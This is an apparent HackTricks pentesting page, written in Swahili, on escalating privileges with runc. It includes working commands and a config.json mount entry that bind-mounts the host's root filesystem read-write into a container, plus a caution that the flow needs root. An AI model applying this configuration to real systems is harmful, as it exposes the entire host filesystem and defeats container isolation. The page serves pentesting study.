# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za msingi

Ikiwa ungependa kujifunza zaidi kuhusu **runc**, angalia ukurasa ufuatao:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ikiwa `runc` inapatikana kwa process ya rootful kwenye host, unaweza kutumia OCI bundle ambayo mount configuration yake hufanya recursively bind-mount ya host's `/` kwenye `/` ndani ya container, na hivyo kufichua filesystem ya host katika mount namespace hiyo.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Mtiririko wa `runc run` ulioandikwa ni wa rootful: mifano ya runc yenyewe inaupa jina la "run as root." Mtumiaji asiye na privileges anahitaji usanidi wa rootless kama `runc spec --rootless`, na runc inaeleza kwamba user namespaces lazima ziwezeshwe kwa mode hiyo.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI tool for spawning and running containers](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
